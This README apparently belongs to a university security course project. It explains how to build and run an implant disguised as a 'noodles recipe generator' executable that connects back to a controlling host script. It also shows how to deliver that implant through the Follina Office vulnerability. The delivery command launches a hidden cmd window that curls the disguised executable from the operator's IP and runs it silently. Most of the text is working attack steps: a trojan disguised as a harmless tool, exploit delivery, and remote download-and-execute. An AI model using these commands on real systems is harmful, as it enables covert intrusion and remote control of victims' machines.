# CS564_FinalProject
By Samuel Almeida, Arjun Viswanathan, and Ben Esenther

# How to run

Running our code can be done via the Python files alone or using the executable and the Follina vulnerability. Note that the executable is too large to have on this repository, but it can be created using the following command: \
```pyinstaller --onefile --add-binary "gui.py;." noodles_recipe_generator.py``` 

This will create a .exe file in the dist directory on your filesystem.

## Without the Follina Vulnerability
To run the executable, run \
```start /B noodles_recipe_generator.exe <IPADDR>``` \
IPADDR: is the IP address of your host system that the implant connects to. 

To run the host, run \
```python host.py IPADDR``` \
IPADDR: is the IP address of your host system that the implant connects to. 

## With the Follina Vulnerability
Firstly, you will need to create a Windows 10 (pre May 2022) Virtual Machine. No requirement for the software. Just use the browser on Windows 10

To run the exploit, run \
```sudo python follina.py -m command -u <IPADDR> -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c curl http://<IPADDR>/noodle_recipes_generator.exe -o c:\users\user\noodle_recipes_generator.exe && start /B c:\users\user\noodle_recipes_generator.exe <IPADDR>'" -t docx``` 

To run the host, run \
```python host.py <IPADDR>``` 

Again, IPADDR is your host machine IP address. 
